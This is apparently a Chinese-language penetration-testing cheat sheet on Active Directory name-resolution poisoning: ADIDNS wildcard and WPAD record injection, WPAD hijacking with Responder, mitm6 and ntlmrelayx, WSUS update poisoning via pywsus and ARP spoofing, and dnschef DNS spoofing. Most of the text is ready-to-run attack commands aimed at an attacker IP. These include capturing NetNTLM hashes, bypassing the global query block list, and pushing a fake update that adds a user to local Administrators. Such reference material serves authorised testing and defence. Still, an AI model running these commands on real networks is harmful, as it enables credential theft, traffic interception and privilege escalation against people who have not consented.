# 名称解析投毒技术详解

## 1. ADIDNS 记录注入

### 1.1 Dynamic Updates vs LDAP 注入

**Dynamic Updates**：
- 标准 DNS 动态更新协议（RFC 2136）
- 域用户默认有权创建新 DNS 记录
- 无法修改已存在的记录（除非是记录所有者）

**LDAP 注入**：
- 直接操作 AD 中的 dnsNode 对象
- dnstool.py 和 Powermad 使用此方式
- 可绕过部分 DNS 安全策略

### 1.2 通配符记录原理

通配符 `*` 记录匹配所有未明确定义的 DNS 查询：
- `server1.domain.com` 已有 A 记录 → 正常解析
- `notexist.domain.com` 无记录 → 匹配 `*` → 解析到攻击者 IP
- 效果：所有拼写错误、不存在的主机名都指向攻击者

### 1.3 WINS Forward Lookup 干扰（Type 65281）

ADIDNS 区域可能配置了 WINS Forward Lookup（DNS 记录类型 65281）：
- 当 DNS 查询无结果时，转发到 WINS 服务器
- WINS 查询可能返回正确结果，绕过通配符记录
- 检查方法：

```bash
# 查询 @ 记录，检查是否有 type 65281
dnstool.py -u '$DOMAIN\$USER' -p '$PASSWORD' --record '@' --action 'query' $DC
# 如果返回中包含 type 65281 → WINS 可能干扰通配符
```

### 1.4 dnstool.py 完整用法

```bash
# 查询现有记录
dnstool.py -u '$DOMAIN\$USER' -p '$PASSWORD' --record '*' --action query $DC
dnstool.py -u '$DOMAIN\$USER' -p '$PASSWORD' --record 'wpad' --action query $DC

# 添加通配符 A 记录
dnstool.py -u '$DOMAIN\$USER' -p '$PASSWORD' --record '*' --action add --data $ATTACKER_IP $DC

# 添加指定主机 A 记录
dnstool.py -u '$DOMAIN\$USER' -p '$PASSWORD' --record 'wpad' --action add --data $ATTACKER_IP $DC

# 修改已有记录（需要是记录所有者）
dnstool.py -u '$DOMAIN\$USER' -p '$PASSWORD' --record '*' --action modify --data $NEW_IP $DC

# 删除记录（清理）
dnstool.py -u '$DOMAIN\$USER' -p '$PASSWORD' --record '*' --action remove $DC

# 使用 --legacy 指定旧 DNS 分区
dnstool.py -u '$DOMAIN\$USER' -p '$PASSWORD' --record '*' --action add --data $ATTACKER_IP --legacy $DC

# 使用 --forest 指定森林级 DNS 分区
dnstool.py -u '$DOMAIN\$USER' -p '$PASSWORD' --record '*' --action add --data $ATTACKER_IP --forest $DC
```

### 1.5 Powermad 用法

```powershell
# 导入模块
Import-Module Powermad

# 添加通配符 A 记录
New-ADIDNSNode -Node * -Data $ATTACKER_IP

# 添加 WPAD A 记录
New-ADIDNSNode -Node wpad -Data $ATTACKER_IP

# 添加 NS 记录（委派子域到攻击者 DNS）
New-ADIDNSNode -Node wpad -Type NS -Data 'attacker.$DOMAIN'

# 查询记录
Get-ADIDNSNodeAttribute -Node * -Attribute DNSRecord

# 删除记录
Remove-ADIDNSNode -Node *

# 授权其他用户管理记录
Grant-ADIDNSPermission -Node * -Principal $USER -Access GenericAll
```

### 1.6 Inveigh 自动模式

```powershell
# combo: 通配符 + NS 记录组合注入
# ns: 仅 NS 记录委派
# wildcard: 仅通配符 A 记录

# 全自动模式（推荐）
Invoke-Inveigh -ADIDNS combo,ns,wildcard -ADIDNSThreshold 3
# ADIDNSThreshold 3: 同一查询未解析 3 次后才注入（减少误操作）

# 指定域和 DC
Invoke-Inveigh -ADIDNS combo -ADIDNSDomain $DOMAIN -ADIDNSDomainController $DC

# 仅通配符 + 阈值控制
Invoke-Inveigh -ADIDNS wildcard -ADIDNSThreshold 5
```

### 1.7 清理命令

```bash
# 务必在测试完成后清理注入的记录
dnstool.py -u '$DOMAIN\$USER' -p '$PASSWORD' --record '*' --action remove $DC
dnstool.py -u '$DOMAIN\$USER' -p '$PASSWORD' --record 'wpad' --action remove $DC
```

```powershell
Remove-ADIDNSNode -Node *
Remove-ADIDNSNode -Node wpad
```

---

## 2. WPAD 劫持

### 2.1 WPAD 解析链

客户端查找 WPAD 的顺序：
1. **DHCP Option 252**：DHCP 服务器返回 WPAD URL
2. **DNS 查询**：查询 `wpad.$DOMAIN`
3. **LLMNR/NBT-NS 广播**：本地链路广播查询 `wpad`

劫持任一环节即可控制客户端代理配置。

### 2.2 攻击向量一：LLMNR/NBT-NS（旧系统）

适用于未打 MS16-077 补丁的系统：

```bash
# Responder 响应 LLMNR/NBT-NS 的 WPAD 查询
responder -I "eth0" -wP

# -w: 启动 WPAD rogue proxy（返回 wpad.dat 指向自身代理）
# -P: 代理要求 NTLM 认证

# 效果：
# 1. 客户端广播查询 wpad → Responder 响应
# 2. 客户端下载 wpad.dat → 配置代理为攻击者
# 3. 客户端 HTTP 流量经过攻击者代理
# 4. 代理要求 NTLM 认证 → 捕获 NetNTLM Hash
```

### 2.3 攻击向量二：ADIDNS GQBL Bypass（新系统）

MS16-077 后，WPAD 不再通过 LLMNR/NBT-NS 解析。需要在 DNS 层面劫持：

```bash
# 方式 A: 添加 wpad A 记录（最简单）
dnstool.py -u '$DOMAIN\$USER' -p '$PASSWORD' --record 'wpad' --action add --data $ATTACKER_IP $DC

# 方式 B: 使用通配符记录
dnstool.py -u '$DOMAIN\$USER' -p '$PASSWORD' --record '*' --action add --data $ATTACKER_IP $DC
```

**NS 记录委派技术**（更隐蔽）：

```powershell
# 将 wpad 子域委派到攻击者控制的 DNS
New-ADIDNSNode -Node wpad -Type NS -Data 'attacker.$DOMAIN'
```

```bash
# 攻击者运行 dnschef 响应委派的 DNS 查询
dnschef --fakeip $ATTACKER_IP --interface $ATTACKER_IP --port 53
```

GQBL（Global Query Block List）默认包含 `wpad` 和 `isatap`，但 ADIDNS 注入可绕过：
- 直接添加 A 记录可能被 GQBL 阻止
- NS 记录委派不受 GQBL 限制
- 通配符记录间接匹配，也不受 GQBL 限制

### 2.4 攻击向量三：DHCPv6

```bash
# mitm6 控制 DNS 后，直接响应 wpad 查询
mitm6 --domain $DOMAIN
# 所有 DNS 查询经过攻击者 → wpad.$DOMAIN 解析到攻击者 IP

# 配合 ntlmrelayx 的 WPAD 功能
ntlmrelayx.py -t $TARGET -wh wpad.$DOMAIN
# -wh: ntlmrelayx 同时充当 WPAD 服务器
```

---

## 3. WSUS 投毒

### 3.1 漏洞检查

```bash
# 检查 WSUS 配置（需要目标访问权限）
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v wuserver
# 返回 http:// 开头 → 可投毒
# 返回 https:// → 需要额外证书攻击，难度大

# 远程检查（通过域用户）
netexec smb $TARGET -u $USER -p $PASSWORD -x "reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v wuserver"
```

### 3.2 pywsus 配置

```bash
# 基础用法：注入 PsExec 执行命令
python3 pywsus.py --host $ATTACKER_IP --port 8530 \
  --executable /path/to/PsExec64.exe \
  --command '/accepteula /s cmd.exe /c "net localgroup Administrators $DOMAIN\\$USER /add"'

# 使用其他 LOLBin
python3 pywsus.py --host $ATTACKER_IP --port 8530 \
  --executable /path/to/RunDLL32.exe \
  --command 'shell32.dll,ShellExec_RunDLL cmd.exe /c "whoami > C:\\Windows\\Temp\\out.txt"'
```

### 3.3 bettercap 流量重定向 caplet

```bash
# wsus-redirect.cap
set arp.spoof.targets $CLIENT_IP
set any.proxy.src_port 8530
set any.proxy.dst_address $ATTACKER_IP
set any.proxy.dst_port 8530

arp.spoof on
any.proxy on
```

```bash
bettercap -iface eth0 -caplet wsus-redirect.cap
```

### 3.4 触发更新检查

```bash
# 手动触发目标检查更新（需要代码执行权限）
wuauclt /detectnow /updatenow

# Windows 10+
UsoClient StartScan
UsoClient StartDownload
UsoClient StartInstall
```

### 3.5 CVE-2020-1013 本地提权

WSUS 本地提权漏洞，可在已有本地访问时利用：
- 修改本地代理设置指向攻击者
- 拦截 WSUS 更新流量
- 注入恶意更新以 SYSTEM 权限执行

---

## 4. DNS 欺骗

### 4.1 Responder DNS

```bash
# Responder 内置 DNS 服务器响应所有查询
responder -I "eth0"
# 配置文件中可自定义响应的域名
```

### 4.2 dnschef

```bash
# 所有查询返回攻击者 IP
dnschef --fakeip $ATTACKER_IP --interface $ATTACKER_IP --port 53

# 仅欺骗特定域名
dnschef --fakedomains $DOMAIN,wpad.$DOMAIN --fakeip $ATTACKER_IP --interface $ATTACKER_IP

# 从文件加载欺骗规则
dnschef --file dns_entries.ini --interface $ATTACKER_IP
```

### 4.3 bettercap dns.spoof

```bash
set dns.spoof.domains *.$DOMAIN
set dns.spoof.address $ATTACKER_IP
set dns.spoof.all true
dns.spoof on
```

DNS 欺骗需要先有 MITM 位置（ARP 投毒等），否则 DNS 查询不经过攻击者。

---

## 5. NBT Name Overwrite

### 概述

NetBIOS Name Overwrite 攻击通过发送 NetBIOS Name Overwrite Demand 包（opcode 0x7）修改目标名称表中的条目。

### 限制

- 工具支持有限，缺乏成熟的公开工具
- 现代 Windows 环境中 NetBIOS 逐步被禁用
- 实战中优先使用 ADIDNS 或 DHCPv6 方式
- 主要作为协议层面的理论参考
